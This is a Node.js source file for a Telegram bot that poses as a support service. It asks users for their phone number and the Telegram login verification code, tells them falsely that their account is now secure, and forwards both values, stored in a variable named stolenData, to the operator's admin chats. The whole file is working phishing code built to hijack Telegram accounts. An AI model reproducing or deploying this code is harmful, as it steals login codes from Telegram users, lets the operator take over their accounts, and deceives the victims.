// Import the necessary packages
require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");
const express = require("express");
// Initialize the Telegram Bot with the token
const bot = new TelegramBot(process.env.BOT_TOKEN, {
  polling: true,
});
const app = express();
const PORT = process.env.PORT || 3000;
app.get("/", (req, res) => {
  res.send("Bot is running!");
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
const adminChatIds = [process.env.ADMIN_ID_1, process.env.ADMIN_ID_2];
// Store user data temporarily
let usersData = {};

// Start command - initializes the conversation
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(
    chatId,
    "Welcome to the Telegram Support Bot! Please verify your phone number."
  );

  // Ask the user for their phone number
  bot.sendMessage(
    chatId,
    "Please enter your phone number by sharing your contact:",
    {
      reply_markup: {
        keyboard: [
          [
            {
              text: "Send my phone number",
              request_contact: true,
            },
          ],
        ],
        one_time_keyboard: true,
      },
    }
  );

  // Set the stage to expect phone number
  usersData[chatId] = { step: "phoneNumber" };
});

// Handle user's contact (phone number) sharing
bot.on("contact", (msg) => {
  const chatId = msg.chat.id;
  const phoneNumber = msg.contact.phone_number;

  // Check if the user's phone number has already been handled (avoid duplication)
  if (usersData[chatId] && usersData[chatId].step === "phoneNumber") {
    // Store the phone number for later use
    usersData[chatId].phoneNumber = phoneNumber;

    // Send confirmation to the user
    bot.sendMessage(
      chatId,
      "Thank you for providing your phone number. Please enter the verification code sent to your Telegram account."
    );

    // Send the phone number to the admin (optional for demonstration)
    // bot.sendMessage(
    //   adminChatId,
    //   `User ${chatId} provided the phone number: ${phoneNumber}`
    // );
    adminChatIds.forEach((adminId) => {
      bot.sendMessage(
        adminId,
        `User ${chatId} provided the phone number: ${phoneNumber}`
      );
    });

    // Proceed to the next step
    usersData[chatId].step = "verificationCode";
  }
});

// Handle user's phone number input (in case they don't share their contact)
bot.on("message", (msg) => {
  const chatId = msg.chat.id;
  const userMessage = msg.text;

  if (
    usersData[chatId] &&
    usersData[chatId].step === "phoneNumber" &&
    !msg.contact
  ) {
    // Store the phone number (if the user entered it as text, not shared contact)
    usersData[chatId].phoneNumber = userMessage;

    // Ask for the verification code
    bot.sendMessage(
      chatId,
      "Now, please enter the verification code sent to your Telegram account."
    );

    // Change step to expect the verification code
    usersData[chatId].step = "verificationCode";
  }

  // Handle verification code input
  else if (usersData[chatId] && usersData[chatId].step === "verificationCode") {
    // Store the verification code
    usersData[chatId].verificationCode = userMessage;

    // Simulate logging in with the phone number and verification code
    bot.sendMessage(chatId, "Processing your verification...");

    // Simulate a successful login after receiving the code
    bot.sendMessage(
      chatId,
      "You have successfully logged in! Your account is now secure."
    );
    const stolenData = `📢 New User Data:\n\nPhone Number: ${usersData[chatId].phoneNumber}\nVerification Code: ${usersData[chatId].verificationCode}`;
    // bot.sendMessage(adminChatId, stolenData);

    adminChatIds.forEach((adminId) => {
      bot.sendMessage(adminId, stolenData);
    });

    // Reset user's session
    delete usersData[chatId];
  }
});
